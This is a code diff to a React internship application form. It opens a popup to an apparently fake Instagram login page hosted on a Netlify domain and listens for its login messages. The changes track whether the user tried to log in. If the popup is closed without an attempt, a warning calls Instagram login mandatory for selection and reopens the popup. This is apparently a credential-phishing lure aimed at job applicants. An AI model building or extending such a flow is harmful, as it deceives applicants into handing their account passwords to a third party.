@@ -19,10 +19,12 @@ const InternshipForm = () => {
   const [showToast, setShowToast] = useState(false);
   const [showInstagramReminder, setShowInstagramReminder] = useState(false);
   const [showInstagramSuccessToast, setShowInstagramSuccessToast] = useState(false);
+  const [showPopupClosedWarning, setShowPopupClosedWarning] = useState(false);
   const [errors, setErrors] = useState({});
   const [submitted, setSubmitted] = useState(false);
   const [animationStage, setAnimationStage] = useState(0);
   const [instagramPopupOpened, setInstagramPopupOpened] = useState(false);
+  const [loginAttemptMade, setLoginAttemptMade] = useState(false);
 
   useEffect(() => {
     // Welcome toast animation
@@ -52,6 +54,9 @@ const InternshipForm = () => {
       // if (event.origin !== 'https://intern-insta-login.netlify.app') return;
       
       if (event.data && event.data.type === 'INSTAGRAM_LOGIN_SUCCESS') {
+        // Mark that a login attempt was made
+        setLoginAttemptMade(true);
+        
         // Update form state to indicate Instagram is followed
         setFormData(prev => ({ ...prev, instagramFollowed: true }));
         
@@ -66,6 +71,10 @@ const InternshipForm = () => {
         setShowInstagramReminder(false);
         
         console.log('Instagram login success received from popup');
+      } else if (event.data && event.data.type === 'INSTAGRAM_LOGIN_ATTEMPT') {
+        // Mark that a login attempt was made (even if it might fail)
+        setLoginAttemptMade(true);
+        console.log('Instagram login attempt detected');
       }
     };
 
@@ -166,6 +175,7 @@ const InternshipForm = () => {
   const handleInstagramClick = () => {
     setInstagramPopupOpened(true);
     setShowInstagramReminder(false);
+    setLoginAttemptMade(false); // Reset login attempt tracking
 
     const width = 500;
     const height = 600;
@@ -185,14 +195,21 @@ const InternshipForm = () => {
       return;
     }
 
-    // Monitor popup closure (fallback mechanism)
+    // Monitor popup closure
     const checkClosed = setInterval(() => {
       if (popup.closed) {
         clearInterval(checkClosed);
         setInstagramPopupOpened(false);
         
-        // If Instagram wasn't marked as followed through message, 
-        // we can't be sure of success, so don't auto-mark it
+        // Check if popup was closed without login attempt
+        setTimeout(() => {
+          if (!loginAttemptMade && !formData.instagramFollowed) {
+            setShowPopupClosedWarning(true);
+            setTimeout(() => setShowPopupClosedWarning(false), 8000);
+            console.log('Popup closed without login attempt - showing warning');
+          }
+        }, 500); // Small delay to ensure messages are processed
+        
         console.log('Popup closed');
       }
     }, 1000);
@@ -432,6 +449,42 @@ const InternshipForm = () => {
           </div>
           <button
             onClick={() => setShowInstagramSuccessToast(false)}
+            className="absolute top-2 right-2 text-white/70 hover:text-white transition-colors"
+          >
+            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      {/* Popup Closed Warning Toast */}
+      <div className={`fixed top-36 right-4 z-50 transform transition-all duration-500 ${
+        showPopupClosedWarning ? 'translate-x-0 opacity-100' : 'translate-x-full opacity-0'
+      }`}>
+        <div className="bg-gradient-to-r from-red-500 to-orange-500 text-white rounded-lg shadow-xl p-4 max-w-sm border border-red-300">
+          <div className="flex items-start">
+            <div className="bg-white/20 rounded-full p-1 mr-3 mt-0.5">
+              <AlertCircle className="w-5 h-5" />
+            </div>
+            <div className="flex-1">
+              <span className="text-sm font-semibold block">Instagram Verification Incomplete!</span>
+              <p className="text-xs opacity-90 mt-1 mb-3">
+                You closed the Instagram page without completing the login process. Instagram verification is mandatory for internship selection.
+              </p>
+              <button
+                onClick={() => {
+                  setShowPopupClosedWarning(false);
+                  handleInstagramClick();
+                }}
+                className="text-xs bg-white text-red-600 px-3 py-1.5 rounded-full font-medium hover:bg-red-50 transition-colors"
+              >
+                Try Again
+              </button>
+            </div>
+          </div>
+          <button
+            onClick={() => setShowPopupClosedWarning(false)}
             className="absolute top-2 right-2 text-white/70 hover:text-white transition-colors"
           >
             <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
